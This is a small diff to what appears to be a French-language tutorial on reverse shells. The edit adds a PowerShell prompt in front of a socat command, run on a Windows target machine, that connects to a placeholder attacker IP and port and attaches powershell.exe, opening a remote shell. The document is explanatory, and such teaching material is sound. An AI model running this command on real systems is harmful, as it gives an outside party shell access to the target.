@@ -20,5 +20,5 @@ Sur la machine cible, on va effectuer la commande :
 1) Sur une machine windows
 
 ```shell
-socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+PS C:\Users\user> socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
 ```
